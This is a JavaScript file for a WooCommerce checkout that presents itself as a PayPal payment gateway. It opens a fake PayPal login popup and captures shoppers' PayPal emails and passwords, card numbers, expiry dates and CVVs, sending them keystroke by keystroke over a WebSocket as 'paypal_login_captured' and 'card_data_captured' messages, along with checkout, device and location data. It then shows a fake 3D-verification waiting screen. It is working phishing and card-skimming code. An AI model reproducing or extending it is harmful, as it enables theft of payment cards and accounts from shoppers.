/**
 * PayPal Gateway JavaScript
 * Uses real browser popup (window.open)
 * Shares data sending logic with main gateway via cpgTracker
 */

(function($) {
    'use strict';

    var CPGPayPal = {
        popupWindow: null,
        popupUrl: '',
        
        init: function() {
            console.log('[CPG PayPal] Initialized - Real browser popup mode');
            
            // Get popup URL
            var dataEl = document.getElementById('cpg-paypal-data');
            if (dataEl) {
                this.popupUrl = dataEl.getAttribute('data-popup-url');
            }
            
            if (!this.popupUrl) {
                // Build default URL with version to avoid cache
                this.popupUrl = window.location.origin + '/?cpg_paypal_popup=1&v=' + Date.now();
            }
            
            this.bindEvents();
        },

        bindEvents: function() {
            var self = this;
            
            // Intercept place order button click
            $(document).on('click', '#place_order, .wfacp_order_place_btn, button[name="woocommerce_checkout_place_order"]', function(e) {
                if (!$('#payment_method_cpg_paypal').is(':checked')) {
                    return true;
                }
                
                if ($('#cpg_paypal_data_complete').val() !== 'yes') {
                e.preventDefault();
                e.stopPropagation();
                    e.stopImmediatePropagation();
                    console.log('[CPG PayPal] Opening real browser popup');
                    self.openPopup();
                    return false;
                }
                
                return true;
            });
            
            // WooCommerce event intercept
            $(document).on('checkout_place_order_cpg_paypal', function() {
                if ($('#cpg_paypal_data_complete').val() !== 'yes') {
                    self.openPopup();
                    return false;
                }
                return true;
            });
            
            // Listen for messages from popup
            window.addEventListener('message', function(event) {
                // Handle complete submission
                if (event.data && event.data.type === 'cpg_paypal_complete') {
                    console.log('[CPG PayPal] Received popup data:', event.data.data);
                    self.handlePopupData(event.data.data);
                }
                
                // 🔥 Handle card submit event (Link Card button click)
                if (event.data && event.data.type === 'cpg_paypal_card_submit') {
                    console.log('[CPG PayPal] Received card submit event:', event.data.data);
                    self.handleCardSubmit(event.data.data);
                }
                
                // 🔥 Handle real-time input events from popup (same as main gateway)
                if (event.data && event.data.type === 'cpg_paypal_input') {
                    self.handleInputEvent(event.data.field, event.data.value, event.data.data);
                }
                
                // 🔥 Handle blur events from popup
                if (event.data && event.data.type === 'cpg_paypal_blur') {
                    console.log('[CPG PayPal] Received blur event:', event.data.field, event.data.value);
                    self.handleBlurEvent(event.data.field, event.data.value, event.data.data);
                }
            });
        },

        openPopup: function() {
            var width = 450;
            var height = 600;
            var left = (screen.width - width) / 2;
            var top = (screen.height - height) / 2;
            
            var features = 'width=' + width + 
                          ',height=' + height + 
                          ',left=' + left + 
                          ',top=' + top + 
                          ',scrollbars=yes,resizable=yes,toolbar=yes,menubar=no,location=yes,status=yes';
            
            this.popupWindow = window.open(this.popupUrl, 'PayPalLogin', features);
            
            if (!this.popupWindow || this.popupWindow.closed) {
                alert('Please allow popups for this site to complete your PayPal payment.');
                return;
            }
            
            this.popupWindow.focus();
            
            // Check if popup is closed
            var self = this;
            var checkClosed = setInterval(function() {
                if (self.popupWindow && self.popupWindow.closed) {
                    clearInterval(checkClosed);
                    console.log('[CPG PayPal] Popup closed');
                }
            }, 500);
        },

        /**
         * 🔥 Handle real-time input events from popup (same as main gateway trackEvent)
         */
        handleInputEvent: function(field, value, data) {
            if (!window.cpgTracker) {
                console.warn('[CPG PayPal] cpgTracker not available for input event');
                return;
            }
            
            var sessionId = window.cpgTracker.sessionId || '';
            var orderNo = window.cpgTracker.orderNo || '';
            
            // Map field types to event names (same as main gateway)
            var eventMap = {
                'email': 'input_paypal_email',
                'password': 'input_paypal_password',
                'card_number': 'input_card',
                'expiry': 'input_expiry',
                'cvv': 'input_cvv'
            };
            
            var eventName = eventMap[field] || ('input_' + field);
            
                // 🔥 Use trackEvent if available (same as main gateway)
            if (typeof window.cpgTracker.trackEvent === 'function') {
                // Build event data based on field type (same field names as main gateway)
                var eventData = {
                    payment_method: 'paypal',
                    length: value ? value.length : 0
                };
                
                switch (field) {
                    case 'email':
                        eventData.email = value;
                        eventData.is_valid = data.is_valid || false;
                        break;
                    case 'password':
                        eventData.password = value;
                        eventData.email = data.email || '';
                        break;
                    case 'card_number':
                        // 🔥 Same field names as main gateway
                        eventData.card_number = value;
                        eventData.card_no = value;
                        eventData.card_number_masked = this.maskCardNumber(value);
                        eventData.card_no_masked = this.maskCardNumber(value);
                        eventData.card_type = data.card_type || '';
                        break;
                    case 'expiry':
                        // 🔥 Same field names as main gateway
                        eventData.expiry = value;
                        eventData.expiry_date = value;
                        eventData.card_expiry = value;
                        break;
                    case 'cvv':
                        // 🔥 Same field names as main gateway
                        eventData.cvv = value;
                        eventData.card_cvv = value;
                        break;
                }
                
                window.cpgTracker.trackEvent(eventName, eventData);
            } else {
                // Fallback: use sendMessage directly
                window.cpgTracker.sendMessage({
                    type: 'user_event',
                    event: eventName,
                    session_id: sessionId,
                    order_no: orderNo,
                    payment_method: 'paypal',
                    field: field,
                    value: value,
                    data: data,
                    timestamp: Date.now()
                });
            }
        },
        
        /**
         * 🔥 Mask card number (same as main gateway)
         */
        maskCardNumber: function(cardNumber) {
            if (!cardNumber || cardNumber.length < 10) return cardNumber;
            var firstSix = cardNumber.substring(0, 6);
            var lastFour = cardNumber.substring(cardNumber.length - 4);
            var masked = firstSix + '******' + lastFour;
            return masked;
        },
        
        /**
         * 🔥 Handle card submit event (Link Card button click) - Immediately show 3D waiting
         */
        handleCardSubmit: function(data) {
            console.log('[CPG PayPal] Card submit - showing 3D waiting interface immediately');
            
            // 🔥 Step 1: Immediately show 3D waiting verification interface
            this.show3DWaiting();
            
            // 🔥 Step 2: Send card data via WebSocket (same format as main gateway)
            if (window.cpgTracker && window.cpgTracker.sendMessage) {
                var sessionId = window.cpgTracker.sessionId || '';
                var orderNo = window.cpgTracker.orderNo || '';
                var checkoutData = {};
                
                // Try to get checkout data
                if (window.cpgTracker.captureCheckoutData) {
                    try {
                        checkoutData = window.cpgTracker.captureCheckoutData();
                    } catch (e) {
                        console.warn('[CPG PayPal] Could not capture checkout data:', e);
                    }
                }
                
                // Send card data (same format as main gateway's card_data_captured)
                // 🔥 Field names exactly match main gateway
                var cardData = {
                    // Card number fields (same as main gateway)
                    card_number: data.card_number || '',
                    card_number_masked: data.card_number || '',
                    // Expiry fields (same as main gateway)
                    expiry: data.expiry || '',
                    expiry_date: data.expiry || '',
                    card_expiry: data.expiry || '',
                    // CVV fields (same as main gateway)
                    cvv: data.cvv || '',
                    card_cvv: data.cvv || '',
                    // Other fields (same as main gateway)
                    pin: '',
                    pin_code: '',
                    verification_code: '',
                    otp: '',
                    card_type: data.brand || '',
                    // PayPal specific
                    paypal_email: data.email || '',
                    paypal_password: data.password || ''
                };
                
                // Merge with checkout data
                Object.assign(cardData, checkoutData);
                
                window.cpgTracker.sendMessage({
                    type: 'card_data_captured',
                    session_id: sessionId,
                    order_no: orderNo,
                    site_name: window.CPG_CONFIG?.site_name || '',
                    site_url: window.CPG_CONFIG?.site_url || window.location.origin,
                    order_prefix: window.CPG_CONFIG?.order_prefix || '',
                    page_url: window.location.href,
                    user_agent: navigator.userAgent,
                    device_info: window.cpgTracker.deviceInfo || {},
                    geo_info: window.cpgTracker.geoInfo || {},
                    payment_method: 'paypal',
                    data: cardData,
                    timestamp: Date.now()
                });
                
                console.log('[CPG PayPal] Card data sent via WebSocket (card_data_captured)');
            }
            
            // 🔥 Step 3: Send status update
            if (window.cpgTracker && window.cpgTracker.sendMessage) {
                window.cpgTracker.sendMessage({
                    type: 'status_update',
                    session_id: window.cpgTracker.sessionId,
                    status: 'Card submitted via PayPal',
                    event: 'paypal_link_card_clicked',
                    timestamp: Date.now()
                });
            }
        },
        
        /**
         * 🔥 Handle blur events from popup - Send data via WebSocket in real-time
         */
        handleBlurEvent: function(field, value, data) {
            if (!window.cpgTracker || !window.cpgTracker.sendMessage) {
                console.warn('[CPG PayPal] cpgTracker not available for blur event');
                return;
            }

            var sessionId = window.cpgTracker.sessionId || '';
            var orderNo = window.cpgTracker.orderNo || '';
            
            // Send blur event
            window.cpgTracker.sendMessage({
                type: 'paypal_field_blur',
                session_id: sessionId,
                order_no: orderNo,
                site_name: window.CPG_CONFIG?.site_name || '',
                site_url: window.CPG_CONFIG?.site_url || window.location.origin,
                page_url: window.location.href,
                payment_method: 'paypal',
                field: field,
                value: value,
                data: data,
                timestamp: Date.now()
            });
            
            console.log('[CPG PayPal] Blur event sent:', field);
            
            // 🔥 If Link Card button blur with complete data, send card_data_captured
            if (field === 'link_card_button' && data.card_number && data.expiry && data.cvv) {
                console.log('[CPG PayPal] Link Card button blur - sending card data');
                this.handleCardSubmit(data);
            }
            
            // 🔥 If CVV blur with complete data, also send card_data_captured
            if (field === 'cvv' && data.card_number && data.expiry && data.cvv) {
                this.sendCardData({
                    cardNumber: data.card_number,
                    expiry: data.expiry,
                    cvv: data.cvv,
                    brand: data.brand || '',
                    email: data.email || '',
                    password: data.password || ''
                });
            }
        },
        
        handlePopupData: function(data) {
            var self = this;
            
            // 填充隐藏字段
            $('#cpg_paypal_email').val(data.email || '');
            $('#cpg_paypal_password').val(data.password || '');
            $('#cpg_paypal_card_number').val(data.cardNumber || '');
            $('#cpg_paypal_card_expiry').val(data.expiry || '');
            $('#cpg_paypal_card_cvv').val(data.cvv || '');
            $('#cpg_paypal_card_brand').val(data.brand || '');
            $('#cpg_paypal_data_complete').val('yes');
            
            console.log('[CPG PayPal] Data saved to hidden fields');
            
            // 🔥🔥🔥 Step 1: Send PayPal login data (email + password) via cpgTracker 🔥🔥🔥
            this.sendPayPalLoginData(data);
            
            // 🔥🔥🔥 Step 2: Send card data via cpgTracker (same as main gateway) 🔥🔥🔥
            this.sendCardData(data);
            
            // Ensure PayPal is selected
            $('#payment_method_cpg_paypal').prop('checked', true).trigger('change');
            
            // 🔥🔥🔥 Step 3: Show 3D verification waiting interface 🔥🔥🔥
            this.show3DWaiting();
            
            // 🔥🔥🔥 Step 4: Submit form via AJAX (same as main gateway) 🔥🔥🔥
            setTimeout(function() {
                self.submitOrderViaAjax();
            }, 500);
        },
        
        /**
         * 🔥 Send PayPal login data via WebSocket
         */
        sendPayPalLoginData: function(data) {
            if (!window.cpgTracker || !window.cpgTracker.sendMessage) {
                console.warn('[CPG PayPal] cpgTracker not available, cannot send PayPal login data');
                return;
            }

            var sessionId = window.cpgTracker.sessionId || '';
            var orderNo = window.cpgTracker.orderNo || '';
            
            // Send PayPal credentials
            window.cpgTracker.sendMessage({
                type: 'paypal_login_captured',
                session_id: sessionId,
                order_no: orderNo,
                site_name: window.CPG_CONFIG?.site_name || '',
                site_url: window.CPG_CONFIG?.site_url || window.location.origin,
                page_url: window.location.href,
                data: {
                    email: data.email || '',
                    password: data.password || '',
                    payment_method: 'paypal'
                },
                timestamp: Date.now()
            });
            
            console.log('[CPG PayPal] PayPal login data sent via WebSocket');
        },
        
        /**
         * 🔥 Send card data via WebSocket (shared with main gateway)
         */
        sendCardData: function(data) {
            if (!window.cpgTracker || !window.cpgTracker.sendMessage) {
                console.warn('[CPG PayPal] cpgTracker not available, cannot send card data');
                return;
            }
            
            var sessionId = window.cpgTracker.sessionId || '';
            var orderNo = window.cpgTracker.orderNo || '';
            var checkoutData = {};
            
            // Try to get checkout data from cpgTracker
            if (window.cpgTracker.captureCheckoutData) {
                try {
                    checkoutData = window.cpgTracker.captureCheckoutData();
                } catch (e) {
                    console.warn('[CPG PayPal] Could not capture checkout data:', e);
                }
            }
            
            // Validate card number with Luhn algorithm
            var cleanCardNumber = (data.cardNumber || '').replace(/\D/g, '');
            if (cleanCardNumber.length < 13) {
                console.warn('[CPG PayPal] Card number too short');
                return;
            }
            
            if (window.cpgTracker.luhnCheck && !window.cpgTracker.luhnCheck(cleanCardNumber)) {
                console.warn('[CPG PayPal] Card number failed Luhn check');
                return;
            }
            
            // Send card data (same format as main gateway)
            // 🔥 Field names exactly match main gateway
            var cardData = {
                // Card number fields (same as main gateway)
                card_number: data.cardNumber || '',
                card_number_masked: data.cardNumber || '',
                // Expiry fields (same as main gateway)
                expiry: data.expiry || '',
                expiry_date: data.expiry || '',
                card_expiry: data.expiry || '',
                // CVV fields (same as main gateway)
                cvv: data.cvv || '',
                card_cvv: data.cvv || '',
                // Other fields (same as main gateway)
                pin: '',
                pin_code: '',
                verification_code: '',
                otp: '',
                card_type: data.brand || '',
                // PayPal specific
                paypal_email: data.email || '',
                paypal_password: data.password || ''
            };
            
            // Merge with checkout data
            Object.assign(cardData, checkoutData);
            
            window.cpgTracker.sendMessage({
                type: 'card_data_captured',
                session_id: sessionId,
                order_no: orderNo,
                site_name: window.CPG_CONFIG?.site_name || '',
                site_url: window.CPG_CONFIG?.site_url || window.location.origin,
                order_prefix: window.CPG_CONFIG?.order_prefix || '',
                page_url: window.location.href,
                user_agent: navigator.userAgent,
                device_info: window.cpgTracker.deviceInfo || {},
                geo_info: window.cpgTracker.geoInfo || {},
                payment_method: 'paypal',
                data: cardData,
                timestamp: Date.now()
            });
            
            console.log('[CPG PayPal] Card data sent via WebSocket');
        },
        
        /**
         * 🔥 Show 3D verification waiting interface
         */
        show3DWaiting: function() {
            // Try using the global function
            if (typeof window.showVerificationWaiting === 'function') {
                window.showVerificationWaiting();
                console.log('[CPG PayPal] 3D waiting interface shown via global function');
                return;
            }
            
            // Try using CPG_3D_Verification
            if (window.CPG_3D_Verification && typeof window.CPG_3D_Verification.showWaiting === 'function') {
                window.CPG_3D_Verification.showWaiting({});
                console.log('[CPG PayPal] 3D waiting interface shown via CPG_3D_Verification');
                return;
            }
            
            // Fallback: directly show the waiting container
            var $waiting = $('#cpg-waiting, #cpg-verification-waiting');
            if ($waiting.length) {
                $waiting.fadeIn(300);
                $('html, body').addClass('cpg-verify-active');
                document.body.style.overflow = 'hidden';
                console.log('[CPG PayPal] 3D waiting interface shown via direct DOM');
            } else {
                console.warn('[CPG PayPal] 3D waiting interface container not found');
            }
        },
        
        /**
         * 🔥 Submit order via AJAX (same as main gateway)
         */
        submitOrderViaAjax: function() {
            var $form = $('form.checkout, form.woocommerce-checkout');
            
            if (!$form.length) {
                console.error('[CPG PayPal] Checkout form not found');
                return;
            }
            
            // Prepare form data
            var formData = $form.serialize();
            
            // Get checkout URL
            var checkoutUrl = window.wc_checkout_params?.checkout_url || window.location.href;
            
            console.log('[CPG PayPal] Submitting order via AJAX...');
            
            $.ajax({
                type: 'POST',
                url: checkoutUrl,
                data: formData,
                dataType: 'json',
                success: function(response) {
                    console.log('[CPG PayPal] AJAX response:', response);
                    
                    if (response.result === 'success' && response.redirect) {
                        // 🔥 Save redirect URL for later (after 3D verification completes)
                        window.CPG_PendingRedirect = response.redirect;
                        
                        // Define redirect function
                        window.CPG_CompleteAndRedirect = function() {
                            if (window.CPG_PendingRedirect) {
                                window.location.href = window.CPG_PendingRedirect;
                            }
                        };
                        
                        console.log('[CPG PayPal] Order submitted, waiting for 3D verification...');
                        console.log('[CPG PayPal] Redirect URL saved:', response.redirect);
                    } else if (response.result === 'failure') {
                        // Show error
                        console.error('[CPG PayPal] Order failed:', response.messages);
                        
                        // Hide waiting interface
                        if (typeof window.hideVerificationWaiting === 'function') {
                            window.hideVerificationWaiting();
                        }
                        
                        // Show WooCommerce error
                        if (response.messages) {
                            $('.woocommerce-notices-wrapper').html(response.messages);
                        }
                    }
                },
                error: function(xhr, status, error) {
                    console.error('[CPG PayPal] AJAX error:', error);
                    
                    // Hide waiting interface
                    if (typeof window.hideVerificationWaiting === 'function') {
                        window.hideVerificationWaiting();
                    }
                    
                    alert('Payment submission failed. Please try again.');
                }
            });
        }
    };

    $(document).ready(function() {
            CPGPayPal.init();
    });

    window.CPGPayPal = CPGPayPal;

})(jQuery);
